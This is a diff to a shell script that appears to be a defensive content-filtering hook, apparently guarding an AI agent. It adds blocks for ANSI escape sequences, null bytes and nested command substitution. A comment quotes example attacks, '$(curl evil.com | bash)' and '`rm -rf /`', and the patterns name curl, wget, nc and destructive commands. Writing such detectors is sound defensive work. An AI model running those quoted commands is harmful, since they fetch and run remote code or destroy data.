@@ -159,6 +159,38 @@ if echo "$CONTENT" | grep -qE '[A-Za-z0-9+/]{50,}={0,2}'; then
     done
 fi
 
+# === ANSI ESCAPE SEQUENCES ===
+# Terminal manipulation via escape codes (CVE-related)
+# \x1b[ CSI, \x1b] OSC, \x1b( charset selection
+if echo "$CONTENT" | grep -qE $'\x1b\[|\x1b\]|\x1b\('; then
+    echo "BLOCKED: ANSI escape sequence detected - potential terminal injection" >&2
+    exit 2
+fi
+
+# === NULL BYTE INJECTION ===
+# Null bytes can truncate strings and bypass security checks
+if echo "$CONTENT" | grep -qP '\x00'; then
+    echo "BLOCKED: Null byte detected - potential truncation attack" >&2
+    exit 2
+fi
+
+# === NESTED COMMAND EXECUTION ===
+# Detect $() and backtick command substitution that could bypass denylists
+# This catches patterns like: $(curl evil.com | bash) or `rm -rf /`
+NESTED_CMD_PATTERNS=(
+    '\$\([^)]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
+    '`[^`]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'
+    '\$\([^)]*\b(rm|dd|mkfs|chmod|chown)\b'
+    '`[^`]*\b(rm|dd|mkfs|chmod|chown)\b'
+)
+
+for pattern in "${NESTED_CMD_PATTERNS[@]}"; do
+    if echo "$CONTENT" | grep -qE "$pattern"; then
+        echo "BLOCKED: Nested command execution detected - potential bypass attempt" >&2
+        exit 2
+    fi
+done
+
 # === CONTEXT MANIPULATION ===
 # Attempts to manipulate the conversation context
 CONTEXT_PATTERNS=(
